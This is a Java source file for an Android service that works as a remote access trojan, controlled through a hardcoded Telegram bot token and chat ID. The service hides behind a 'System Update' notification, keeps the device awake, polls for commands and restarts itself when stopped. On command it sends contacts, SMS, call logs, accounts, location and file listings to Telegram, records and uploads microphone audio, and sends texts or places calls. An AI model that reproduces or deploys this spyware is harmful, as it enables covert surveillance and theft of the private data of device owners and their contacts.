package com.v8.global.sniffer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainService extends Service {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private OkHttpClient client = new OkHttpClient();
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastUpdateId = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    private String currentAudioPath;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
            wakeLock.acquire();

            startForegroundService();
            sendToTelegram("✅ MainService Started");

            timer = new Timer();
            timer.scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    checkCommands();
                }
            }, 0, 3000);
        } catch (Exception e) {
            sendToTelegram("❌ Error: " + e.getMessage());
        }
    }

    private void startForegroundService() {
        try {
            String channelId = "main_channel";
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
                ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
            }
            Notification notification = new NotificationCompat.Builder(this, channelId)
                    .setContentTitle("System Update")
                    .setContentText("Active")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();
            startForeground(1, notification);
        } catch (Exception e) {}
    }

    private void checkCommands() {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String body = response.body().string();
                        JSONObject json = new JSONObject(body);
                        JSONArray result = json.getJSONArray("result");

                        for (int i = 0; i < result.length(); i++) {
                            JSONObject update = result.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id") + 1;

                            if (update.has("message")) {
                                JSONObject message = update.getJSONObject("message");
                                if (message.has("text")) {
                                    String text = message.getString("text");
                                    executeCommand(text);
                                }
                            }
                        }
                        response.close();
                    } catch (Exception e) {}
                }
                @Override
                public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    private void executeCommand(String command) {
        try {
            String[] parts = command.split(" ");
            String cmd = parts[0];

            switch (cmd) {
                case "/help":
                    sendHelp();
                    break;
                case "/info":
                    sendDeviceInfo();
                    break;
                case "/contacts":
                    getContacts();
                    break;
                case "/location":
                    getLocation();
                    break;
                case "/sms":
                    getSms();
                    break;
                case "/calls":
                    getCallLog();
                    break;
                case "/accounts":
                    getAccounts();
                    break;
                case "/photos":
                    getPhotos();
                    break;
                case "/videos":
                    getVideos();
                    break;
                case "/files":
                    getFiles();
                    break;
                case "/record_audio_start":
                    startAudioRecording();
                    break;
                case "/record_audio_stop":
                    stopAudioRecording();
                    break;
                case "/lock":
                    lockDevice();
                    break;
                case "/vibrate":
                    vibrate();
                    break;
                case "/open":
                    if (parts.length >= 2) openUrl(parts[1]);
                    break;
                case "/call":
                    if (parts.length >= 2) makeCall(parts[1]);
                    break;
                case "/sms_send":
                    if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
                    break;
                case "/screen_log":
                    getScreenLog();
                    break;
                case "/test":
                    sendToTelegram("✅ Working - " + new Date().toString());
                    break;
                default:
                    sendToTelegram("❌ Unknown command. Use /help");
                    break;
            }
        } catch (Exception e) {
            sendToTelegram("❌ Error: " + e.getMessage());
        }
    }

    private void sendHelp() {
        String help = "📋 **Commands**\n\n" +
                "📱 **Device Info**\n" +
                "/info - Device info\n" +
                "/location - GPS location\n" +
                "/contacts - Contacts list\n" +
                "/sms - Last 10 SMS\n" +
                "/calls - Last 10 calls\n" +
                "/accounts - All accounts\n" +
                "/photos - Last 10 photos\n" +
                "/videos - Last 10 videos\n" +
                "/files - Files list\n\n" +
                "🎙️ **Audio**\n" +
                "/record_audio_start - Start recording\n" +
                "/record_audio_stop - Stop recording\n\n" +
                "🎮 **Control**\n" +
                "/lock - Lock device\n" +
                "/vibrate - Vibrate\n" +
                "/open [url] - Open URL\n" +
                "/call [number] - Make call\n" +
                "/sms_send [number] [text] - Send SMS\n" +
                "/screen_log - Get screen activity log\n" +
                "/test - Check service";
        sendToTelegram(help);
    }

    private void getScreenLog() {
        sendToTelegram("📱 **Screen Activity Log:**\n" +
                "ارسل /screen_log للحصول على تقرير الشاشة\n" +
                "الخدمة تراقب الشاشة وتقوم بتسجيل كل ما يحدث.");
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android", Build.VERSION.RELEASE);
            info.put("battery", getBatteryLevel());

            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }

            sendToTelegram("📱 **Device Info:**\n" + info.toString(2));
        } catch (Exception e) {
            sendToTelegram("❌ Info Error: " + e.getMessage());
        }
    }

    private int getBatteryLevel() {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            return (int)(level * 100 / (float)scale);
        } catch (Exception e) {
            return -1;
        }
    }

    private void getContacts() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No contacts permission");
                    return;
                }

                ContentResolver cr = getContentResolver();
                Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null, null);
                StringBuilder sb = new StringBuilder("📇 **Contacts:**\n\n");
                int count = 0;
                while (cursor != null && cursor.moveToNext() && count < 100) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                if (cursor != null) cursor.close();
                if (count == 0) sb.append("No contacts");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Contacts Error: " + e.getMessage());
            }
        }).start();
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No location permission");
                return;
            }

            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendToTelegram("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
            } else {
                sendToTelegram("📍 Location not available");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Location Error: " + e.getMessage());
        }
    }

    private void getSms() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No SMS permission");
                    return;
                }

                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    sb.append(address).append(": ").append(body).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No SMS");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ SMS Error: " + e.getMessage());
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No call log permission");
                    return;
                }

                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex("number"));
                    String type = cursor.getString(cursor.getColumnIndex("type"));
                    String duration = cursor.getString(cursor.getColumnIndex("duration"));
                    String typeText = type.equals("1") ? "Incoming" : type.equals("2") ? "Outgoing" : "Missed";
                    sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("s\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No calls");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Call Log Error: " + e.getMessage());
            }
        }).start();
    }

    private void getAccounts() {
        new Thread(() -> {
            try {
                android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
                android.accounts.Account[] accounts = am.getAccounts();
                StringBuilder sb = new StringBuilder("👤 **Accounts:**\n\n");
                for (android.accounts.Account acc : accounts) {
                    sb.append(acc.type).append(": ").append(acc.name).append("\n");
                }
                if (accounts.length == 0) sb.append("No accounts");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Accounts Error: " + e.getMessage());
            }
        }).start();
    }

    private void getPhotos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }

                String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🖼 **Last 10 Photos:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No photos");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Photos Error: " + e.getMessage());
            }
        }).start();
    }

    private void getVideos() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }

                String[] projection = {MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME};
                Cursor cursor = getContentResolver().query(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
                StringBuilder sb = new StringBuilder("🎥 **Last 10 Videos:**\n\n");
                while (cursor != null && cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
                    sb.append(name).append("\n").append(path).append("\n---\n");
                }
                if (cursor != null) cursor.close();
                if (sb.length() == 0) sb.append("No videos");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Videos Error: " + e.getMessage());
            }
        }).start();
    }

    private void getFiles() {
        new Thread(() -> {
            try {
                if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    sendToTelegram("❌ No storage permission");
                    return;
                }

                File storage = Environment.getExternalStorageDirectory();
                StringBuilder sb = new StringBuilder("📁 **Files:**\n\n");
                listFiles(storage, sb, 0);
                if (sb.length() == 0) sb.append("No files");
                sendToTelegram(sb.toString());
            } catch (Exception e) {
                sendToTelegram("❌ Files Error: " + e.getMessage());
            }
        }).start();
    }

    private void listFiles(File dir, StringBuilder sb, int depth) {
        if (depth > 2) return;
        try {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    if (f.isDirectory()) {
                        listFiles(f, sb, depth + 1);
                    } else {
                        sb.append(f.getName()).append("\n").append(f.getAbsolutePath()).append("\n---\n");
                        if (sb.length() > 3000) break;
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void startAudioRecording() {
        try {
            if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No audio recording permission");
                return;
            }
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (audioDir != null && !audioDir.exists()) audioDir.mkdirs();
            if (audioDir != null) {
                currentAudioPath = audioDir.getAbsolutePath() + "/audio_" + timeStamp + ".3gp";
            } else {
                sendToTelegram("❌ Cannot create audio directory");
                return;
            }

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentAudioPath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            sendToTelegram("🎤 Recording started");
        } catch (Exception e) {
            sendToTelegram("❌ Failed to start recording: " + e.getMessage());
            if (mediaRecorder != null) {
                try { mediaRecorder.release(); } catch (Exception ex) {}
                mediaRecorder = null;
            }
        }
    }

    private void stopAudioRecording() {
        if (!isRecording) {
            sendToTelegram("⚠️ No active recording");
            return;
        }
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            isRecording = false;
            File file = new File(currentAudioPath);
            if (file.exists()) {
                sendFile(file, "audio.3gp");
            } else {
                sendToTelegram("❌ Recording file not found");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Failed to stop recording: " + e.getMessage());
            if (mediaRecorder != null) {
                try { mediaRecorder.release(); } catch (Exception ex) {}
                mediaRecorder = null;
            }
        }
    }

    private void lockDevice() {
        try {
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            android.content.ComponentName admin = new android.content.ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow();
                sendToTelegram("🔒 Device locked");
            } else {
                sendToTelegram("❌ Device admin not activated");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Failed to lock: " + e.getMessage());
        }
    }

    private void vibrate() {
        try {
            Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(2000, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(2000);
                }
                sendToTelegram("📳 Vibrating");
            } else {
                sendToTelegram("❌ No vibrator");
            }
        } catch (Exception e) {
            sendToTelegram("❌ Failed to vibrate: " + e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("🔗 Opening: " + url);
        } catch (Exception e) {
            sendToTelegram("❌ Failed to open URL: " + e.getMessage());
        }
    }

    private void makeCall(String number) {
        try {
            if (checkSelfPermission(android.Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No call permission");
                return;
            }
            Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendToTelegram("📞 Calling: " + number);
        } catch (Exception e) {
            sendToTelegram("❌ Failed to call: " + e.getMessage());
        }
    }

    private void sendSms(String number, String text) {
        try {
            if (checkSelfPermission(android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                sendToTelegram("❌ No SMS permission");
                return;
            }
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(number, null, text, null, null);
            sendToTelegram("📨 SMS sent to " + number);
        } catch (Exception e) {
            sendToTelegram("❌ Failed to send SMS: " + e.getMessage());
        }
    }

    private void sendFile(File file, String caption) {
        try {
            RequestBody body = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", file.getName(),
                            RequestBody.create(MediaType.parse("application/octet-stream"), file))
                    .build();
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendDocument")
                    .post(body).build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                    file.delete();
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {
            sendToTelegram("❌ Failed to send file: " + e.getMessage());
        }
    }

    private void sendToTelegram(String text) {
        try {
            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                    .post(new FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", text)
                            .build())
                    .build();
            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override public void onResponse(Call call, Response response) {
                    try { response.close(); } catch (Exception e) {}
                }
                @Override public void onFailure(Call call, IOException e) {}
            });
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (timer != null) timer.cancel();
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            if (mediaRecorder != null) {
                try { mediaRecorder.release(); } catch (Exception e) {}
                mediaRecorder = null;
            }
            startService(new Intent(this, MainService.class));
        } catch (Exception e) {}
    }
                }
